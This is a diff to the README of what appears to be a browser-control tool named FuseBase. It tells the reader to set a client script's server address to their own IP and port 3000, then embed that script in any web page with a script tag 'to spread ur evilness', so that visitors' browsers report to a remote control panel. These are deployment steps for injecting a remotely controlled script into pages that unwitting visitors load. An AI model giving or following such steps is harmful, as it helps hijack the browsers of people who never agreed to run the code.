@@ -16,8 +16,9 @@ Remember that running malicious code on someone's machine without their knowledg
 
 ## Step 2: Run and JS inclusion
 1. Run `npm start` in the root dir
-2. (Here is where the hosting part comes in) grab a link to `src/client/client.js` and include it wherever u wanna spread ur evilness (or goodness depending on what ur doing) AKA normal `<script src="link"></script>` anywhere in the html.
-3. Get into the W.I.P Control Panel `yourip:3000`
+2. Edit `src/client/client.js` with any text editor and change the `nodeJsIp` const to `http://yourip:3000` (you might wanna get a DDNS)
+3. (Here is where the hosting part comes in) grab a link to `src/client/client.js` and include it wherever u wanna spread ur evilness (or goodness depending on what ur doing) AKA normal `<script src="link"></script>` anywhere in the html.
+4. Get into the W.I.P Control Panel `yourip:3000`
 
 ## Step 3: Use existing modules or write your own:
 See the [wiki](https://github.com/lukas2005/FuseBase/wiki)
